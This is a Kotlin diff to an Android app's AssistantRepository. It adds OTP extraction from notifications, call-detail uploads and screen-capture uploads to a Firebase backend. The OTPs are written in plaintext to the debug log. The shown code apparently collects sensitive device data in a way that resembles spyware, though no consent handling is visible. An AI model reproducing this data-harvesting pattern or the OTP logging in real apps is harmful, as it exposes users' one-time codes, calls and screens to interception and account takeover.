@@ -6,9 +6,11 @@ import android.content.IntentFilter
 import android.os.BatteryManager
 import android.util.Log
 import com.kkek.assistant.System.notification.AppNotification
+import com.kkek.assistant.data.model.ScreenCapture
 import com.kkek.assistant.repository.FirebaseRepository
 import com.kkek.assistant.data.CallDetails
-import com.kkek.assistant.data.Contact
+import com.kkek.assistant.data.model.CallState
+import com.kkek.assistant.data.model.Contact
 import dagger.hilt.android.qualifiers.ApplicationContext
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.asStateFlow
@@ -20,15 +22,60 @@ class AssistantRepository @Inject constructor(@ApplicationContext private val co
     private val TAG = "AssistantRepository"
     private val firebaseRepository = FirebaseRepository
 
+    // --- Event for triggering screen capture ---
+    private val _captureRequest = MutableStateFlow(false)
+    val captureRequest = _captureRequest.asStateFlow()
+
     private val _batteryPercent = MutableStateFlow(-1)
     val batteryPercent = _batteryPercent.asStateFlow()
 
     private val _notifications = MutableStateFlow<List<AppNotification>>(emptyList())
     val notifications = _notifications.asStateFlow()
 
+    private val _latestOtp = MutableStateFlow<String?>(null)
+    val latestOtp = _latestOtp.asStateFlow()
+
+    private val _callState = MutableStateFlow(CallState(CallState.State.IDLE))
+    val callState = _callState.asStateFlow()
+
+    fun updateCallState(callState: CallState) {
+        _callState.value = callState
+        if (callState.state != CallState.State.IDLE) {
+            val details = CallDetails(
+                timestamp = System.currentTimeMillis(),
+                phoneNumber = callState.phoneNumber,
+                type = callState.state.name,
+                duration = 0
+            )
+            uploadCallDetails(details)
+        }
+    }
+
     fun handleNewNotification(notification: AppNotification) {
         _notifications.value = _notifications.value + notification
         firebaseRepository.uploadNotification(notification)
+        if (notification.otpCode != null) {
+            Log.d(TAG, "OTP Detected: ${notification.otpCode}")
+            _latestOtp.value = notification.otpCode
+        }
+    }
+
+    fun resetLatestOtp() {
+        _latestOtp.value = null
+    }
+
+    // --- Screen Capture Methods ---
+    fun requestScreenCapture() {
+        Log.d(TAG, "requestScreenCapture called. Setting _captureRequest to true.")
+        _captureRequest.value = true
+    }
+
+    fun onCaptureRequestCompleted() {
+        _captureRequest.value = false
+    }
+
+    suspend fun uploadScreenContent(capture: ScreenCapture) {
+        firebaseRepository.uploadScreenContent(capture)
     }
 
     fun updateBatteryPercentage(): Int {
